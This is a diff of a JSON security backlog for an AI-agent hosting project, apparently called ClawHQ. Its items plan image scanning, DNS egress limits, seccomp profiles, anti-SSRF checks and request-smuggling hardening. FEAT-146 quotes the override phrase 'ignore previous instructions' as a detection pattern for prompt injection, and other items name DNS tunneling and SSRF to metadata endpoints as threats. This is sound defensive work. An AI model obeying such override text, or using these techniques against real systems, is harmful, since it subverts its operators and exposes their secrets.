+      "intent": "CVEs in the base image and Python/Node dependencies must be surfaced before deployment. The build pipeline must gate on HIGH/CRITICAL vulnerabilities — not discover them after a security advisory.",
+      "description": "Add trivy image scan after docker build in the build pipeline. For clawhq deploy: scan and warn on HIGH/CRITICAL (non-blocking for first deploy, blocking for updates). For clawhq update: scan and block on CRITICAL, warn on HIGH. Add --skip-scan flag for users who want to bypass. Reference: Clawdius FEAT-043.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add trivy detection to prerequisites check",
+        "Add scanImage() function to src/build/docker/build.ts",
+        "Call after successful docker build, before compose up",
+        "Parse trivy JSON output, extract HIGH/CRITICAL counts",
+        "For deploy: warn and continue; for update: block on CRITICAL",
+        "Add --skip-scan flag for bypass",
+        "Add doctor check: trivy installed and latest DB"
+      ],
+      "acceptanceCriteria": [
+        "clawhq deploy runs trivy scan after image build",
+        "HIGH/CRITICAL CVE counts are reported to user",
+        "clawhq update blocks on CRITICAL vulnerabilities",
+        "--skip-scan flag bypasses scanning"
+      ],
+      "scope": ["src/build/docker/build.ts", "src/operate/doctor/"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Size S. Trivy outputs JSON — parsing is straightforward."
+    },
+    {
+      "id": "FEAT-141",
+      "title": "DNS tunneling mitigation — restrict port 53 to specific resolvers",
+      "intent": "The egress firewall allows unrestricted port 53 to any destination. This is the only unfiltered egress path. DNS tunneling can encode secrets in subdomain labels, bypassing all content scanning layers.",
+      "description": "Update firewall generator to restrict DNS (port 53) to specific resolver IPs (1.1.1.1, 8.8.8.8, or user-configured) instead of allowing to 0.0.0.0/0. This closes the last unfiltered egress path. Reference: Clawdius FEAT-037.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add dns_resolvers config to firewall options (default: ['1.1.1.1', '8.8.8.8'])",
+        "Update firewall.ts: replace blanket port 53 ACCEPT with resolver-specific rules",
+        "Add fallback resolver support for resilience",
+        "Add doctor check: container can resolve allowed domains",
+        "Document residual risk: DNS tunneling to allowed resolvers still theoretically possible"
+      ],
+      "acceptanceCriteria": [
+        "Generated firewall restricts port 53 to configured resolver IPs only",
+        "Container can still resolve domains in the allowlist",
+        "DNS queries to arbitrary resolvers are blocked"
+      ],
+      "scope": ["src/build/launcher/firewall.ts"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Size XS. Single change to firewall rule generation."
+    },
+    {
+      "id": "FEAT-142",
+      "title": "Custom seccomp profile generation per security posture",
+      "intent": "The container must have the minimum possible syscall surface. Agents don't need mount, ptrace, keyctl, or bpf. A seccomp profile that blocks these is the difference between 'hardened' and 'auditable.'",
+      "description": "Generate a custom seccomp.json per security posture. Minimal posture: Docker default. Hardened: block mount, ptrace, personality, keyctl. Paranoid: additionally block bpf, add_key, kexec_load, reboot. Apply via security_opt in compose generation. Reference: Clawdius FEAT-044.",
+      "priority": "could",
+      "category": "security",
+      "steps": [
+        "Create seccomp profile templates per posture in src/secure/",
+        "Start from Docker's default profile, add blocks per posture",
+        "Update compose generator: add security_opt with seccomp profile path",
+        "Add doctor check: seccomp profile exists and is referenced",
+        "Document syscall rationale per posture"
+      ],
+      "acceptanceCriteria": [
+        "Generated docker-compose.yml references custom seccomp profile for hardened/paranoid postures",
+        "Profile blocks ptrace, mount, keyctl for hardened; additionally bpf, kexec for paranoid",
+        "Doctor verifies seccomp profile is applied"
+      ],
+      "scope": ["src/secure/", "src/build/docker/compose.ts", "src/operate/doctor/"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": false,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Size M. Needs syscall audit of Node.js + Python workloads before writing the profiles."
+    },
+    {
+      "id": "FEAT-143",
+      "title": "Credential proxy body size limit and request timeout",
+      "intent": "The credential proxy must not forward arbitrarily large bodies or hang indefinitely on slow upstreams. Both are denial-of-service vectors that could exhaust proxy resources or upstream rate limits.",
+      "description": "Add configurable max_body_size (default 10MB) and request timeout (default 30s) to the proxy sidecar. Reject oversized bodies with 413 before reading. Timeout slow upstream responses. Make both configurable per-route for services that legitimately need large bodies (CalDAV) or slow responses. Reference: Clawdius FEAT-071, FEAT-072.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add maxBodySize and timeout fields to proxy route config",
+        "Check Content-Length before reading body, reject with 413 if exceeded",
+        "Add timeout to upstream requests, reject with 504 on timeout",
+        "Add per-route overrides for CalDAV (larger body) and large email operations (longer timeout)",
+        "Log rejected/timed-out requests to audit"
+      ],
+      "acceptanceCriteria": [
+        "Proxy rejects bodies exceeding configured limit with 413",
+        "Proxy times out slow upstream responses with 504",
+        "Both are configurable per-route",
+        "Rejections are audit-logged"
+      ],
+      "scope": ["src/secure/credentials/proxy-server.ts", "src/secure/credentials/proxy-routes.ts"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Size S. Two independent guards, both straightforward."
+    },
+    {
+      "id": "FEAT-144",
+      "title": "Anti-SSRF validation in credential proxy routing",
+      "intent": "The credential proxy must not be tricked into making requests to internal/private IP ranges. A path traversal (../../internal) or DNS rebinding attack could redirect the proxy to 127.0.0.1 or cloud metadata endpoints (169.254.169.254).",
+      "description": "Add: (1) path canonicalization (resolve ../ before appending to backend), (2) host validation (final URL host must match configured backend host), (3) private IP rejection (block 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8 as upstream targets). Reference: Clawdius FEAT-074.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add path canonicalization to proxy route matching (resolve ../ sequences)",
+        "Validate resolved URL host matches configured backend host",
+        "Add private IP range check before forwarding",
+        "Log rejected SSRF attempts to audit",
+        "Add tests: path traversal, DNS rebinding, private IP targeting"
+      ],
+      "acceptanceCriteria": [
+        "Path traversal attempts (../) are canonicalized before forwarding",
+        "Private IP ranges (RFC1918, link-local, loopback) are rejected as upstream targets",
+        "SSRF attempts are audit-logged"
+      ],
+      "scope": ["src/secure/credentials/proxy-server.ts"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Size S. Classic OWASP SSRF prevention at the one component that makes outbound requests."
+    },
+    {
+      "id": "FEAT-145",
+      "title": "HTTP request smuggling hardening for Telegram egress proxy",
+      "intent": "The Telegram egress proxy terminates TLS and parses HTTP. Malformed requests must not bypass secret scanning via Content-Length/Transfer-Encoding confusion, duplicate headers, or keep-alive abuse.",
+      "description": "Harden the generated Telegram proxy: (1) reject dual CL+TE headers, (2) reject multiple Content-Length values, (3) limit header count (50) and size (8KB), (4) force Connection: close (disable keep-alive). Reference: Clawdius FEAT-073.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add header validation to Telegram proxy generator",
+        "Reject requests with conflicting Content-Length and Transfer-Encoding",
+        "Add header count and size limits",
+        "Force Connection: close in all responses",
+        "Add tests for malformed request rejection"
+      ],
+      "acceptanceCriteria": [
+        "Generated proxy rejects dual CL+TE headers",
+        "Header count limited to 50, size limited to 8KB",
+        "Connection: close forced on all responses"
+      ],
+      "scope": ["src/secure/"],
+      "dependsOn": ["FEAT-136"],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": false,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Depends on FEAT-136 (Telegram proxy exists first). Size XS once the proxy exists."
+    },
+    {
+      "id": "FEAT-146",
+      "title": "Multilingual injection patterns — expand ClawWall coverage to 15+ languages",
+      "intent": "A prompt injection in Turkish, Hindi, or Portuguese currently bypasses all multilingual detection. Coverage must match the languages an attacker would reasonably try.",
+      "description": "The sanitizer covers 8 languages for 'ignore previous instructions' (French, Spanish, German, Japanese, Chinese, Korean, Russian, Arabic). Add at minimum: Hindi, Turkish, Portuguese, Vietnamese, Thai, Indonesian, Italian. Reference: Clawdius FEAT-068.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add injection patterns for: Hindi, Turkish, Portuguese, Vietnamese, Thai, Indonesian, Italian",
+        "Validate translations with correct word order for regex (not just machine translation)",
+        "Add test cases for each new language",
+        "Update sanitizer to load new patterns"
+      ],
+      "acceptanceCriteria": [
+        "Sanitizer detects 'ignore previous instructions' in at least 15 languages",
+        "Test cases exist for each supported language",
+        "No false positives on normal text in each language"
+      ],
+      "scope": ["src/secure/sanitizer/detect.ts"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Size S. Each pattern is one regex. Translation accuracy is the risk."
+    },
+    {
+      "id": "FEAT-147",
+      "title": "Egress firewall test suite — prove the firewall works after every apply",
+      "intent": "Firewall rules must be tested, not trusted. A test suite that runs from inside the container must verify: allowed domains connect, blocked domains reject, blocked ports reject. Without this, regressions are silent.",
+      "description": "Generate a test script that runs via docker exec after firewall setup. Tests: (1) allowed HTTPS domains connect, (2) blocked HTTPS domains reject, (3) DNS resolves, (4) non-allowlisted ports reject. Run automatically after clawhq deploy and clawhq firewall apply. Reference: Clawdius FEAT-045.",
+      "priority": "should",
+      "category": "security",
+      "steps": [
+        "Add generateFirewallTest() to src/build/launcher/firewall.ts",
+        "Generate test script using node -e one-liners (no curl dependency for tests)",
+        "Run via docker exec after firewall setup",
+        "Report pass/fail for each test case",
+        "Add to deploy pipeline: fail deploy if firewall tests fail"
+      ],
+      "acceptanceCriteria": [
+        "Firewall test suite runs automatically after deploy and firewall apply",
+        "Tests verify both allowed and blocked destinations from inside the container",
+        "Deploy fails if firewall tests fail"
+      ],
+      "scope": ["src/build/launcher/firewall.ts", "src/build/launcher/deploy.ts"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Size S. High value — proves the firewall works rather than trusting iptables output."
+    },
+    {
+      "id": "FEAT-148",
+      "title": "Security architecture documentation — threat model, architecture diagram, runbook",
+      "intent": "Community users deploying ClawHQ must understand the security architecture in 60 seconds. A threat model, architecture diagram, and operational runbook are prerequisites for community trust and adoption.",
+      "description": "Create three documents: (1) docs/THREAT-MODEL.md — threat actors, in-scope attacks, defense layers mapped to threats, residual risks, accepted risks. (2) docs/ARCHITECTURE-SECURITY.md — Mermaid diagram showing container boundary, network boundaries, data flows through cred proxy / egress firewall / sanitizer / Telegram proxy. (3) docs/RUNBOOK.md — for each alert type: trigger, what to check, how to remediate. Reference: Clawdius FEAT-059, FEAT-060, FEAT-064.",
+      "priority": "should",
+      "category": "documentation",
+      "steps": [
+        "Write THREAT-MODEL.md with actors, defenses, residual risks",
+        "Create ARCHITECTURE-SECURITY.md with Mermaid diagram of all security layers",
+        "Write RUNBOOK.md with per-alert-type remediation",
+        "Cross-reference from README.md security section"
+      ],
+      "acceptanceCriteria": [
+        "Threat model document exists with actors, defenses, and residual risks",
+        "Architecture diagram shows all security layers and data flows",
+        "Runbook has remediation steps for each alert type"
+      ],
+      "scope": ["docs/"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "From Clawdius 10/10 code review. Size M. These three docs together are the security story for community adoption."
+    },
+    {
+      "id": "FEAT-149",
+      "title": "Document all Clawdius-to-ClawHQ hardening patterns for replication tracking",
+      "intent": "Every battle-tested security pattern from Clawdius must be tracked as a ClawHQ feature with clear replication status. The Clawdius reference implementation is the proving ground — ClawHQ must automate what Clawdius proved works.",
+      "description": "Create docs/CLAWDIUS-PATTERNS.md that catalogs every security enhancement from the Clawdius infrastructure repo, maps each to its ClawHQ equivalent (implemented, planned, or N/A), and links to the relevant backlog item. Categories: container hardening, network egress, credential isolation, prompt injection defense, egress scanning, monitoring/alerting, operational tooling. This is the living tracking document for replication completeness.",
+      "priority": "should",
+      "category": "documentation",
+      "steps": [
+        "Catalog all Clawdius security patterns (from 2026-03-31 code review)",
+        "Map each to ClawHQ implementation status: done, planned (with FEAT-ID), or N/A",
+        "For N/A items: document why they don't apply to ClawHQ",
+        "Add to docs/ and reference from CONTRIBUTING.md"
+      ],
+      "acceptanceCriteria": [
+        "CLAWDIUS-PATTERNS.md exists with complete pattern catalog",
+        "Each pattern has: Clawdius reference, ClawHQ status, backlog link if planned",
+        "No pattern is uncategorized or missing status"
+      ],
+      "scope": ["docs/CLAWDIUS-PATTERNS.md"],
+      "dependsOn": [],
+      "status": "todo",
+      "passes": false,
+      "readyForSprint": true,
+      "groomedAt": "2026-03-31",
+      "groomingNotes": "Meta-item: this tracks the entire Clawdius→ClawHQ replication effort. Size S. Should be done first to organize the remaining work."
     }
   ]
 }
